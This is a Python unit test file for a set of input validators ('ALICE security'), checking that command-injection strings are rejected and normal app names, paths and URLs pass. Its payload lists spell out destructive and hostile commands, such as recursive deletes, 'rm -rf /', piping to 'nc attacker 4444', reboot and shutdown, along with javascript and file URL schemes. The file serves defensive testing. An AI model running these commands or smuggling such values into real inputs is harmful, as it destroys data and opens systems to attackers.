"""
Unit tests for the ALICE security validators.

These are pure and run on any OS (no Windows automation required). They are the
regression guarantee that command-injection payloads are rejected and that
legitimate input still passes unchanged.

Run:  python -m pytest alice_security/tests/ -q
  or: python -m unittest discover -s alice_security/tests
"""

import os
import sys
import unittest

# Allow running directly (python alice_security/tests/test_validators.py)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from alice_security.validators import (  # noqa: E402
    validate_app_name,
    validate_path,
    validate_url,
    validate_search_query,
    validate_app_protocol,
    contains_shell_metacharacters,
)
from alice_security.errors import SecurityValidationError  # noqa: E402


# The documented attack payloads from VULNERABILITIES.md + classic vectors.
INJECTION_PAYLOADS = [
    "notepad & calc",
    "notepad && del /s C:\\",
    'test.txt" && del /s C:\\ && echo "',
    "*.txt\" & del /s C:\\ &",
    "app; rm -rf /",
    "app | nc attacker 4444",
    "app `whoami`",
    "app $(reboot)",
    "app\nshutdown -h now",
    "app > /etc/passwd",
    "calc & taskkill /IM explorer.exe",
]

LEGITIMATE_APP_NAMES = [
    "notepad",
    "Calculator",
    "Visual Studio Code",
    "7-Zip",
    "Notepad++",
    "Microsoft.WindowsNotepad",
    "Google Chrome",
    "spotify",
    "VLC media player",
]


class TestShellMetacharacters(unittest.TestCase):
    def test_detects_each_metachar(self):
        for ch in "&|;<>$`":
            self.assertTrue(contains_shell_metacharacters(f"app{ch}evil"))

    def test_clean_name_has_none(self):
        self.assertFalse(contains_shell_metacharacters("Visual Studio Code"))


class TestValidateAppName(unittest.TestCase):
    def test_rejects_injection_payloads(self):
        for payload in INJECTION_PAYLOADS:
            with self.assertRaises(SecurityValidationError, msg=f"accepted: {payload!r}"):
                validate_app_name(payload)

    def test_accepts_legitimate_names(self):
        for name in LEGITIMATE_APP_NAMES:
            self.assertEqual(validate_app_name(name), name.strip())

    def test_rejects_empty(self):
        with self.assertRaises(SecurityValidationError):
            validate_app_name("   ")

    def test_rejects_overlong(self):
        with self.assertRaises(SecurityValidationError):
            validate_app_name("a" * 500)


class TestValidatePath(unittest.TestCase):
    def test_rejects_quotes_and_chaining(self):
        for bad in ['a.txt" && del x', "a.txt; rm -rf /", "a`whoami`.txt", "a|b.txt"]:
            with self.assertRaises(SecurityValidationError):
                validate_path(bad)

    def test_rejects_newline(self):
        with self.assertRaises(SecurityValidationError):
            validate_path("a\nb.txt")

    def test_accepts_normal_path(self):
        # Should normalize without raising.
        out = validate_path("some/folder/file.txt")
        self.assertTrue(out.endswith(os.path.join("folder", "file.txt")))

    def test_allowed_roots_blocks_traversal(self):
        root = os.path.dirname(os.path.abspath(__file__))
        with self.assertRaises(SecurityValidationError):
            validate_path(os.path.join(root, "..", "..", "..", "etc", "passwd"),
                          allowed_roots=[root])

    def test_allowed_roots_permits_inside(self):
        root = os.path.dirname(os.path.abspath(__file__))
        inside = os.path.join(root, "sub", "f.txt")
        out = validate_path(inside, allowed_roots=[root])
        self.assertTrue(out.startswith(root))

    def test_must_exist(self):
        with self.assertRaises(SecurityValidationError):
            validate_path("/no/such/path/really/12345.bin", must_exist=True)


class TestValidateUrl(unittest.TestCase):
    def test_accepts_http_https(self):
        self.assertEqual(validate_url("https://example.com"), "https://example.com")
        self.assertEqual(validate_url("http://localhost:3000"), "http://localhost:3000")

    def test_defaults_bare_host_to_https(self):
        self.assertEqual(validate_url("example.com"), "https://example.com")

    def test_rejects_dangerous_schemes(self):
        for bad in ["javascript:alert(1)", "file:///etc/passwd", "data:text/html,x"]:
            with self.assertRaises(SecurityValidationError):
                validate_url(bad)

    def test_rejects_chaining_chars(self):
        with self.assertRaises(SecurityValidationError):
            validate_url("https://example.com & calc")


class TestValidateAppProtocol(unittest.TestCase):
    def test_recognizes_allowlisted(self):
        self.assertEqual(validate_app_protocol("whatsapp:"), "whatsapp")
        self.assertEqual(validate_app_protocol("ms-windows-store://pdp/?x=1"),
                         "ms-windows-store")

    def test_rejects_unknown_and_dirty(self):
        self.assertIsNone(validate_app_protocol("evilproto:"))
        self.assertIsNone(validate_app_protocol("notaprotocol"))


class TestValidateSearchQuery(unittest.TestCase):
    def test_accepts_normal_terms(self):
        self.assertEqual(validate_search_query("report.pdf"), "report.pdf")
        self.assertEqual(validate_search_query("*.txt"), "*.txt")

    def test_rejects_newline_and_empty(self):
        with self.assertRaises(SecurityValidationError):
            validate_search_query("a\nb")
        with self.assertRaises(SecurityValidationError):
            validate_search_query("   ")


if __name__ == "__main__":
    unittest.main(verbosity=2)
